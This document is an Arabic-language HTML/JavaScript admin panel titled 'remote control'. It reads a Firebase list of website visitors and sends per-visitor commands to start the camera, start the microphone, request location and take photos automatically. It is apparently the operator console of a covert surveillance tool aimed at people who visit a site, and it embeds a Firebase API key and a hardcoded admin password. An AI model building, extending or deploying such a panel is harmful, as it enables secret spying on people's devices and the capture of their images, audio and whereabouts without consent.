<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة الإدارة - التحكم عن بعد</title>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-storage-compat.js"></script>

  <style>
    body { font-family: 'Cairo', sans-serif; background:#f1f5f9; margin:0; }
    .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
    table { width:100%; border-collapse: collapse; background:white; border-radius:12px; overflow:hidden; box-shadow:0 4px 15px rgba(0,0,0,0.1); }
    th, td { padding: 14px; text-align: right; border-bottom: 1px solid #ddd; cursor:pointer; }
    th { background: #1e40af; color: white; }
    .control-panel { background:white; padding:25px; border-radius:12px; margin:20px 0; }
    button { padding:12px 20px; margin:5px; border:none; border-radius:8px; font-size:1rem; cursor:pointer; }
    .btn-camera { background:#ef4444; color:white; }
    .btn-location { background:#3b82f6; color:white; }
    .btn-mic { background:#10b981; color:white; }
    .selected { background:#fefce8 !important; }
  </style>
</head>
<body>

<div class="container">
  <h1>🔧 لوحة الإدارة - التحكم عن بعد</h1>
  
  <div class="control-panel">
    <h2>الزوار الحاليين (<span id="count">0</span>)</h2>
    <table id="table">
      <thead>
        <tr>
          <th>معرف الزائر</th>
          <th>الجهاز</th>
          <th>الموقع</th>
          <th>الكاميرا</th>
          <th>الميكروفون</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>
  </div>

  <div id="visitor-controls" class="control-panel" style="display:none;">
    <h2>التحكم في الزائر: <span id="selected-id"></span></h2>
    <button class="btn-camera" onclick="sendCommand('startCamera')">📹 تشغيل الكاميرا</button>
    <button class="btn-location" onclick="sendCommand('requestLocation')">📍 طلب الموقع</button>
    <button class="btn-mic" onclick="sendCommand('startMic')">🎤 تشغيل الميكروفون</button>
    <button onclick="sendCommand('takePhoto')" style="background:#8b5cf6; color:white;">📸 التقاط صورة تلقائياً</button>
  </div>
</div>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyBQ9MlVOSzohuTqSA2JdI19UjyldnAb-zI",
    authDomain: "ohaha-d130e.firebaseapp.com",
    projectId: "ohaha-d130e",
    storageBucket: "ohaha-d130e.firebasestorage.app",
    messagingSenderId: "309282072723",
    appId: "1:309282072723:web:ed17bfe365577fba2ec566"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  let selectedVisitor = null;

  function login() {
    const pass = prompt("أدخل كلمة مرور الإدارة:");
    if (pass === "521988") loadVisitors();
    else { alert("خطأ"); window.location.href = "index.html"; }
  }

  function loadVisitors() {
    const tbody = document.querySelector('#table tbody');
    db.ref('visitors').on('value', snap => {
      tbody.innerHTML = '';
      let count = 0;
      snap.forEach(child => {
        count++;
        const d = child.val();
        const row = document.createElement('tr');
        row.innerHTML = `
          <td>${child.key}</td>
          <td>${d.device || '-'}</td>
          <td>${d.location ? '✅' : '❌'}</td>
          <td>${d.permissions?.camera ? '✅' : '❌'}</td>
          <td>${d.permissions?.mic ? '✅' : '❌'}</td>
        `;
        row.onclick = () => selectVisitor(child.key, row);
        tbody.appendChild(row);
      });
      document.getElementById('count').textContent = count;
    });
  }

  function selectVisitor(id, row) {
    document.querySelectorAll('tr').forEach(r => r.classList.remove('selected'));
    row.classList.add('selected');
    selectedVisitor = id;
    document.getElementById('selected-id').textContent = id;
    document.getElementById('visitor-controls').style.display = 'block';
  }

  function sendCommand(type) {
    if (!selectedVisitor) return alert("اختر زائر أولاً");
    db.ref('commands/' + selectedVisitor).set({
      type: type,
      timestamp: Date.now(),
      adminTriggered: true
    });
    alert(`✅ تم إرسال الأمر "${type}" إلى الزائر`);
  }

  window.onload = login;
</script>
</body>
</html>
